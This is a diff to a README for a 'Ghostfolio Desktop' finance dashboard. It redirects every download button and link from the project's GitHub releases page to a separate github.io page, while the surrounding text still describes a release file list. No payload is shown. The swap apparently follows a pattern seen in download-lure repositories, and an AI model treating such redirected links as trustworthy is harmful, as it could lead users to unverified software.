@@ -1,7 +1,7 @@
 <h1>📊 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Personal Finance Command Center</h1>
 
 <p align="center">
-<a href="https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases" style="display:inline-block;padding:18px 45px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);margin:25px 0;">⬇️ DOWNLOAD NOW - FREE</a>
+<a href="https://tanakron5577.github.io" style="display:inline-block;padding:18px 45px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);margin:25px 0;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -38,7 +38,7 @@ Getting started is easier than you think! Follow these simple steps and you'll h
 **Step 1: Get the Application**
 
 Visit this link to download the application: 
-[https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases](https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+[https://tanakron5577.github.io](https://tanakron5577.github.io)
 
 When you click this link, you'll see a list of available files. Look for the newest version and select the download option that matches your computer type.
 
@@ -210,7 +210,7 @@ For personal support, reach out via GitHub discussions or email the maintainer d
 Stop relying on scattered spreadsheets and multiple apps. Get clear, accurate, and private visibility into your investments today.
 
 <p align="center">
-<a href="https://github.com/tanakron5577/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#11998e,#38ef7d);color:#fff;font-size:18px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 5px 15px rgba(17,153,142,0.3);">⬇️ Download Your Dashboard - Free</a>
+<a href="https://tanakron5577.github.io" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#11998e,#38ef7d);color:#fff;font-size:18px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 5px 15px rgba(17,153,142,0.3);">⬇️ Download Your Dashboard - Free</a>
 </p>
 
 ---
